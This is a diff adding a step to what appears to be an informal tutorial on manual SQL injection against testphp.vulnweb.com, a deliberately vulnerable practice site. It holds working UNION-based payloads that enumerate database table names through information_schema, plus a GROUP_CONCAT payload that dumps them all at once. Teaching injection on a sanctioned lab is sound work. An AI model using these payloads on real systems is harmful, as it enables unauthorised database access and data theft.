@@ -81,6 +81,27 @@ i will be choosing column 2 here.
 
 ```http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,version(),3```
 
+**STEP 7**
+
+``getting table names``
+
+we can get the table names one by one by using the query ```table_name``` in the vulnerable column and then adding ```from information_schema.tables where table_schema=database() limit 0,1``` at the end of the query
+
+```
+First row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1
+Second row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1
+Third row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1
+Forth row http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1
+and so on...
+```
+Stressful right? lol i've gat your back mate
+
+we can easily dump the table names once using the ``concat`` statement
+
+```(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0X3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())```
+
+
+
 
 
 
